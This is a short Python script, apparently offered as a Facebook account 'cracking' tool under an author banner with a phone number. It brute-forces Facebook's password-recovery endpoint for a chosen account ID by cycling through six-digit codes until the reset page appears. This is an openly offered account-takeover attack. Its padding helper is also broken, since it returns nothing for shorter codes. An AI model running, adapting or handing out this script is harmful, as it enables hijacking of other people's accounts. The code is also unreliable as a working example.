import requests, os, re, time, ssl, sys
os.system('clear')
a = requests.Session()

def D(code):
    z = len(str(code))
    if z < 6:
        h = 6 - z
    else:
        return str(code)


print('\x1b[1;32mwelcome\x1b[1;35m to\x1b[1;36m HETLAR\x1b[1;34m 7AKEM\x1b[1;33m EL3ALAM\x1b[1;30m FBCODE\x1b[1;32m tool')
time.sleep(0.1)
print('\x1b[1;35mphone\x1b[1;30m :\x1b[1;32m 201148422820')
time.sleep(0.1)
print('\x1b[1;30m+---------------------------------+')
time.sleep(0.1)
print('\x1b[1;30m|\x1b[1;32m [+]\x1b[1;34m HETLAR 7AKEM EL3ALAM   \x1b[1;32m[+]\x1b[1;30m  |')
time.sleep(0.1)
print('\x1b[1;30m|\x1b[1;32m [+]\x1b[1;33m     Ma7moud med7at    \x1b[1;32m [+]\x1b[1;30m  |')
time.sleep(0.1)
print('\x1b[1;30m|\x1b[1;32m [+]\x1b[1;36m       Database_HK     \x1b[1;32m [+]\x1b[1;30m  |')
time.sleep(0.1)
print('\x1b[1;30m+---------------------------------+')
time.sleep(0.1)
print('\x1b[1;31mDont forget to put quotation')
time.sleep(0.1)
print('marks when you enter ID ')
time.sleep(0.1)
print('with regards (HETLAR)')
print('                                            ')
print('programmed by HETLAR 7AKEM EL3ALAM')
id = str(input('\x1b[1;32mId Acount >> : '))
code = int(input('\x1b[1;36mStart Code >> : '))
m = input('\x1b[1;33moff Code >> ')
os.system('clear')
print('\x1b[1;34m[*] Account \x1b[1;30m' + id)
time.sleep(1)
print('\x1b[1;31m[*] code on \x1b[1;30m' + str(D(code)))
time.sleep(1)
print('\x1b[1;33m[*] code off\x1b[1;30m ' + D(m))
time.sleep(1)
print('\x1b[1;35m[*] Cracking Please wait ...')
print('')
print('')
time.sleep(2)
while code < 999999:
    code = code + 1
    url="https://www.facebook.com/recover/password/?u="+id+"&n="+D(code)
    r = requests.get(url)
    ap = r.text
    search = re.search("password_new",ap)
    if search:
        print('\x1b[1;36m[+] This is the code\x1b[1;31m ' + D(code))
        sys.exit()
    else:
        print('\x1b[1;31m[-]\x1b[1;35m testing Guess \x1b[1;32m' + D(code))
